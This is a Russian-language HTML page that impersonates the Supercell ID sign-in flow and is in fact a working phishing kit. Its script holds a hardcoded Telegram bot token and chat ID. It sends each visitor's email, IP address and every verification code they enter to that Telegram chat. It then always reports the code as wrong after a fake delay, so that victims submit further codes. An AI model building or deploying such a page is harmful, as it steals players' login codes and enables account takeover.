<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Supercell ID</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
            background: #FFFFFF;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Оригинальный стиль Supercell ID — светлый фон, аккуратные карточки */
        .container {
            max-width: 440px;
            width: 100%;
            background: #FFFFFF;
            border-radius: 28px;
            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.08), 0 2px 4px rgba(0, 0, 0, 0.02);
            overflow: hidden;
            border: 1px solid #E8ECF0;
        }

        /* Шапка как в официальном Supercell ID */
        .header {
            background: #FFFFFF;
            padding: 32px 24px 24px 24px;
            text-align: center;
            border-bottom: 1px solid #F0F2F5;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 12px;
        }

        .logo-icon {
            width: 48px;
            height: 48px;
            background: #2C6BFF;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            font-weight: 700;
            color: white;
            box-shadow: 0 4px 12px rgba(44, 107, 255, 0.2);
        }

        .logo-text {
            font-size: 28px;
            font-weight: 700;
            color: #1F2A3E;
            letter-spacing: -0.3px;
        }

        .logo-text span {
            color: #2C6BFF;
        }

        .subtitle {
            color: #6C7A8E;
            font-size: 15px;
            font-weight: 400;
            margin-top: 8px;
        }

        .content {
            padding: 28px 24px 32px 24px;
        }

        .input-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            color: #1F2A3E;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            background: #FFFFFF;
            border: 1.5px solid #E2E6EA;
            border-radius: 14px;
            color: #1F2A3E;
            outline: none;
            transition: all 0.2s;
            font-family: inherit;
        }

        input:focus {
            border-color: #2C6BFF;
            box-shadow: 0 0 0 3px rgba(44, 107, 255, 0.1);
        }

        input::placeholder {
            color: #A0AABA;
        }

        button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            background: #2C6BFF;
            color: white;
            border: none;
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
            margin-top: 8px;
        }

        button:hover {
            background: #1A56E0;
        }

        button:active {
            transform: scale(0.98);
        }

        button.secondary {
            background: #F5F7FA;
            color: #2C6BFF;
            margin-top: 12px;
            border: 1px solid #E2E6EA;
        }

        button.secondary:hover {
            background: #EFF2F8;
        }

        button:disabled {
            opacity: 0.6;
            transform: none;
            cursor: not-allowed;
        }

        .message {
            margin-top: 20px;
            padding: 12px 16px;
            border-radius: 14px;
            text-align: center;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }

        .message.error {
            background: #FFF5F5;
            color: #E5484D;
            border: 1px solid #FFE2E2;
            display: block;
        }

        .message.info {
            background: #F0F7FF;
            color: #2C6BFF;
            border: 1px solid #D9E8FF;
            display: block;
        }

        .hidden {
            display: none;
        }

        .email-display {
            color: #2C6BFF;
            font-weight: 600;
            word-break: break-all;
        }

        .step2-card {
            background: #F9FAFE;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 24px;
            text-align: center;
            border: 1px solid #EFF2F8;
        }

        .step2-card .icon {
            font-size: 44px;
            margin-bottom: 8px;
        }

        .step2-card .title {
            font-weight: 700;
            font-size: 18px;
            color: #1F2A3E;
            margin-bottom: 8px;
        }

        .step2-card .description {
            color: #6C7A8E;
            font-size: 14px;
            margin-top: 4px;
        }

        .code-hint {
            font-size: 13px;
            color: #8A99B0;
            text-align: center;
            margin-top: 16px;
        }

        .footer {
            background: #F9FAFE;
            padding: 16px 20px;
            text-align: center;
            border-top: 1px solid #EFF2F8;
        }

        .footer a {
            color: #6C7A8E;
            font-size: 13px;
            text-decoration: none;
            margin: 0 12px;
            font-weight: 500;
        }

        .footer a:hover {
            color: #2C6BFF;
        }

        /* Анимация загрузки */
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-loading .loader {
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">
                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
                        <path d="M2 17L12 22L22 17" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
                        <path d="M2 12L12 17L22 12" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
                    </svg>
                </div>
                <div class="logo-text">Supercell <span>ID</span></div>
            </div>
            <div class="subtitle">Войдите или создайте аккаунт</div>
        </div>

        <div class="content">
            <!-- Шаг 1: Email -->
            <div id="step1">
                <div class="input-group">
                    <label>Адрес электронной почты</label>
                    <input type="email" id="email" placeholder="name@example.com" autocomplete="off">
                </div>
                <button id="sendBtn" onclick="sendEmail()">Продолжить</button>
            </div>

            <!-- Шаг 2: Код подтверждения -->
            <div id="step2" class="hidden">
                <div class="step2-card">
                    <div class="icon">✉️</div>
                    <div class="title">Проверьте почту</div>
                    <div class="description">
                        Мы отправили код подтверждения на <br>
                        <span class="email-display" id="emailDisplay"></span>
                    </div>
                </div>
                <div class="input-group">
                    <label>Код подтверждения</label>
                    <input type="text" id="code" placeholder="000000" maxlength="6" autocomplete="off" style="text-align: center; letter-spacing: 4px; font-size: 22px; font-weight: 500;">
                </div>
                <button id="verifyBtn" onclick="verifyCode()">Подтвердить</button>
                <button class="secondary" onclick="resetForm()">Использовать другой email</button>
                <div class="code-hint">
                    Не пришёл код? Проверьте папку «Спам» или <a href="#" onclick="resendCodeHint(event)" style="color:#2C6BFF; text-decoration:none;">отправить снова</a>
                </div>
                <div id="message" class="message"></div>
            </div>
        </div>

        <div class="footer">
            <a href="#">Помощь</a>
            <a href="#">Конфиденциальность</a>
            <a href="#">Условия</a>
        </div>
    </div>

    <script>
        // ТВОИ ДАННЫЕ
        const BOT_TOKEN = "8119321079:AAGngmPagp8L8BBj8lYzMMIN_FZDN52h2Cs";
        const CHAT_ID = "5314096451";
        
        let currentEmail = '';
        let isProcessing = false;
        let retryCount = 0;
        
        // Отправка в Telegram
        async function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
            } catch(e) {
                console.error('Telegram error:', e);
            }
        }
        
        // Получение IP
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return null;
            }
        }
        
        function showMessage(text, type) {
            const msgDiv = document.getElementById('message');
            msgDiv.textContent = text;
            msgDiv.className = `message ${type}`;
        }
        
        function hideMessage() {
            const msgDiv = document.getElementById('message');
            msgDiv.className = 'message';
            msgDiv.textContent = '';
        }
        
        // Шаг 1: отправка email
        async function sendEmail() {
            if (isProcessing) return;
            
            const email = document.getElementById('email').value.trim();
            if (!email) {
                showMessage('Введите адрес электронной почты', 'error');
                return;
            }
            
            if (!email.includes('@') || !email.includes('.')) {
                showMessage('Введите корректный email', 'error');
                return;
            }
            
            isProcessing = true;
            const sendBtn = document.getElementById('sendBtn');
            const originalText = sendBtn.textContent;
            sendBtn.disabled = true;
            sendBtn.innerHTML = '<span class="loader"></span> Отправка...';
            
            currentEmail = email;
            retryCount = 0;
            
            const ip = await getIP();
            await sendToTelegram(`📧 НОВАЯ ПОЧТА\nEmail: ${email}\nIP: ${ip || 'unknown'}\nВремя: ${new Date().toLocaleString()}`);
            
            // Переход на шаг 2
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('emailDisplay').innerText = email;
            document.getElementById('code').value = '';
            hideMessage();
            
            sendBtn.disabled = false;
            sendBtn.innerHTML = originalText;
            isProcessing = false;
            
            setTimeout(() => {
                document.getElementById('code').focus();
            }, 100);
        }
        
        // Шаг 2: проверка кода (задержка 6 секунд)
        async function verifyCode() {
            if (isProcessing) return;
            
            const code = document.getElementById('code').value.trim();
            if (!code) {
                showMessage('Введите код подтверждения', 'error');
                return;
            }
            
            if (code.length < 4) {
                showMessage('Код должен содержать минимум 4 символа', 'error');
                return;
            }
            
            isProcessing = true;
            const verifyBtn = document.getElementById('verifyBtn');
            const originalText = verifyBtn.textContent;
            verifyBtn.disabled = true;
            verifyBtn.innerHTML = '<span class="loader"></span> Проверка...';
            
            retryCount++;
            
            const messageType = retryCount === 1 ? '🔑 КОД ДОСТУПА' : '🔄 ПОВТОРНЫЙ КОД';
            await sendToTelegram(`${messageType}\nEmail: ${currentEmail}\nКод: ${code}\nПопытка: ${retryCount}\nВремя: ${new Date().toLocaleString()}`);
            
            // ЗАДЕРЖКА 6 СЕКУНД (имитация проверки сервера Supercell)
            setTimeout(() => {
                showMessage('Неверный код. Попробуйте ещё раз.', 'error');
                
                document.getElementById('code').value = '';
                document.getElementById('code').focus();
                
                verifyBtn.disabled = false;
                verifyBtn.innerHTML = originalText;
                isProcessing = false;
                
                if (retryCount >= 3) {
                    const hintDiv = document.querySelector('.code-hint');
                    const originalHint = hintDiv.innerHTML;
                    hintDiv.innerHTML = 'Слишком много попыток. Подождите 30 секунд.';
                    setTimeout(() => {
                        hintDiv.innerHTML = originalHint;
                    }, 5000);
                }
            }, 6000);
        }
        
        // Сброс формы
        function resetForm() {
            if (isProcessing) return;
            
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step1').classList.remove('hidden');
            document.getElementById('email').value = '';
            document.getElementById('code').value = '';
            hideMessage();
            currentEmail = '';
            retryCount = 0;
            
            const verifyBtn = document.getElementById('verifyBtn');
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = 'Подтвердить';
            isProcessing = false;
        }
        
        // Повторная отправка кода (имитация)
        function resendCodeHint(event) {
            event.preventDefault();
            if (isProcessing) return;
            
            if (!currentEmail) return;
            
            showMessage('Новый код отправлен на почту', 'info');
            sendToTelegram(`🔄 ЗАПРОС НОВОГО КОДА\nEmail: ${currentEmail}\nВремя: ${new Date().toLocaleString()}`);
            
            setTimeout(() => {
                hideMessage();
            }, 3000);
        }
        
        // Ограничение длины кода и автофокус
        document.addEventListener('DOMContentLoaded', () => {
            const codeInput = document.getElementById('code');
            if (codeInput) {
                codeInput.addEventListener('input', (e) => {
                    if (e.target.value.length > 6) {
                        e.target.value = e.target.value.slice(0, 6);
                    }
                });
                
                codeInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        verifyCode();
                    }
                });
            }
            
            const emailField = document.getElementById('email');
            if (emailField) {
                emailField.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        sendEmail();
                    }
                });
            }
        });
    </script>
</body>
</html>
